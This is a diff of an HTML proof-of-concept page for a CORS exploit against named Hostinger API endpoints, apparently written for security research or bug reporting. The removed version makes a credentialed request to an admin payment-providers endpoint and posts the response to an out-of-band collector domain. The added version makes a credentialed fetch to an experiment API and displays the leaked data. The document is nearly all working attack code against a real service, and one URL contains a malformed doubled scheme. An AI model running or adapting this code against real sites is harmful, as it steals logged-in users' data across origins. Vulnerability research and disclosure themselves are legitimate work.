@@ -1,33 +1,21 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h3>Hostinger CORS Exploit PoC</h3>
-    <button onclick="exploit()">Run Exploit</button>
-    <pre id="output"></pre>
-
-    <script>
-      function exploit() {
-        const xhttp = new XMLHttpRequest();
-
-        xhttp.onreadystatechange = function () {
-          if (this.readyState === 4) {
-            // Display the response
-            document.getElementById("output").innerText = this.responseText;
-
-            // Exfiltrate the data to your OAST domain
-            const exfil = new XMLHttpRequest();
-            exfil.open("POST", "http://c0s9990o3dsqhber0th8y7ks6cum7aj.oast.fun", true);
-            exfil.setRequestHeader("Content-Type", "application/json");
-            exfil.send(JSON.stringify({ data: this.responseText }));
-          }
-        };
-
-        // Target the vulnerable CORS endpoint
-        xhttp.open("POST", "https://https://api-ecommerce.hostinger.com/admin/payment-providers", true);
-        xhttp.withCredentials = true;
-        xhttp.setRequestHeader("X-Custom-Header", "exploit");
-        xhttp.send(); // Can send a body if needed
-      }
-    </script>
-  </body>
+<head><title>CORS PoC</title></head>
+<body>
+<script>
+  fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
+    method: "GET",
+    headers: {
+      "X-Custom-Header": "abc"
+    },
+    credentials: "include"
+  })
+  .then(res => res.text())
+  .then(data => {
+    // Send data back to your own server or just show it
+    alert("Leaked Data: " + data);
+  })
+  .catch(err => console.error("Request failed:", err));
+</script>
+</body>
 </html>
